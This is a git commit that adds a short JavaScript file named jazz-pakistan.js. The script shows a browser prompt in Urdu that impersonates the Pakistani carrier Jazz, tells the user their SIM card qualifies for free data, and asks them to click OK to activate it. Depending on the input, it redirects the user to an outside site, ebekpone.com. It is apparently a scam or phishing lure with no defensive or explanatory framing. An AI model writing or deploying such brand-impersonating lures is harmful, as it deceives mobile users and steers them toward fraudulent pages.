030572f6dd39dd0a1bdd01782382f946edf03111
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-03-20 00:15:07 -0700

    Create jazz-pakistan.js

---
+++ jazz-pakistan.js
@@ -0,0 +1,5 @@
+var password = 'چالو کریں۔'
+password=prompt('Jazz: مبارک ہو، آپ کا Jazz SIM CARD مفت ڈیٹا حاصل کرنے کا اہل ہے ابھی ڈیٹا کو ایکٹیویٹ کرنے کے لیے Ok پر کلک کریں','چالو کریں۔');
+if (password != 'چالو کریں۔') {
+location.href='https://ebekpone.com/jazz.html';
+}
